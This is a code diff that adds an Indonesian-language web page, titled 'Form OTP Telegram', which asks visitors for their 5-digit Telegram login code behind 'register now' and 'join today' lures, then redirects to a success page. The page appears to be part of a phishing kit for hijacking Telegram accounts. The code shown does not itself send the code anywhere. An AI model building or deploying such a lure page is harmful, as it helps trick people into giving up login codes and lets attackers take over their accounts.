@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Form OTP Telegram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .header-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+    .animated-title {
+      font-size: 20px;
+      color: #007bff;
+      font-weight: bold;
+      display: inline-block;
+      transform-origin: center;
+      animation: scaleXopenclose 2.5s infinite ease-in-out;
+    }
+    @keyframes scaleXopenclose {
+      0%, 100% {
+        transform: scaleX(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scaleX(0);
+        opacity: 0.5;
+      }
+    }
+    input[type="text"] {
+      padding: 15px;
+      width: 100%;
+      font-size: 18px;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+    }
+    .btn {
+      background-color: #007bff;
+      color: white;
+      padding: 15px;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+      font-size: 18px;
+      box-sizing: border-box;
+    }
+    .btn:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+    .btn-danger {
+      background-color: red;
+      margin-top: 20px;
+    }
+    .image-bawah {
+      width: 100%;
+      max-width: 500px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Gambar Bagian Atas -->
+  <img src="IMG-20250510-WA0008_2.jpg" alt="Daftar Sekarang" class="header-image">
+
+  <!-- Form OTP -->
+  <div class="container">
+    <h3 class="animated-title">INPUT DATA DENGAN TEPAT DAN BENAR</h3>
+    <p>KONFIRMASI OTP TELEGRAM</p>
+    <input type="text" id="otp" maxlength="5" placeholder="5 Digit Kode Masuk"
+           oninput="validateOTP()" inputmode="numeric" pattern="[0-9]*">
+    <button class="btn" id="submitBtn" disabled onclick="submitForm()">Lanjut</button>
+    <img src="IMG-20250510-WA0008_1.jpg" alt="OTP Ilustrasi" class="image-bawah">
+    <button class="btn btn-danger">BERGABUNG HARI INI</button>
+  </div>
+
+  <script>
+    function validateOTP() {
+      const input = document.getElementById("otp");
+      const btn = document.getElementById("submitBtn");
+
+      // Hanya angka
+      input.value = input.value.replace(/\D/g, '');
+
+      // Aktifkan tombol jika 5 digit
+      btn.disabled = !/^\d{5}$/.test(input.value);
+    }
+
+    function submitForm() {
+  const otp = document.getElementById("otp").value;
+  if (/^\d{5}$/.test(otp)) {
+    window.location.href = "berhasil3.html";
+  } else {
+    alert("Kode OTP harus 5 digit.");
+  }
+}
+  </script>
+
+</body>
+</html>
